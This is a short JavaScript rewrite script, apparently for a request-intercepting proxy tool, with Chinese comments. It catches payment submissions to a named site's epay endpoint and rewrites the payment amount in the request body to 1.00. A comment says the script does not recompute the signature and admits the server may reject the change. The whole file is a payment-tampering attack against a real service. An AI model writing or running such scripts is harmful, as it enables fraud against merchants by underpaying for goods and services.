// 文件名：simple_payment_change.js
// 这个版本只修改金额，不重新计算签名

if ($request && $request.url && $request.url.indexOf('credit.linux.do/epay/pay/submit.php') !== -1) {
    console.log("拦截到支付请求");
    
    const body = $request.body;
    console.log("原始请求体: " + body);
    
    // 直接替换金额
    const newBody = body.replace(/money=\d+\.\d{2}/, 'money=1.00');
    console.log("修改后请求体: " + newBody);
    
    // 注意：如果服务器验证签名，这个请求会被拒绝
    $done({body: newBody});
} else {
    $done({});
}
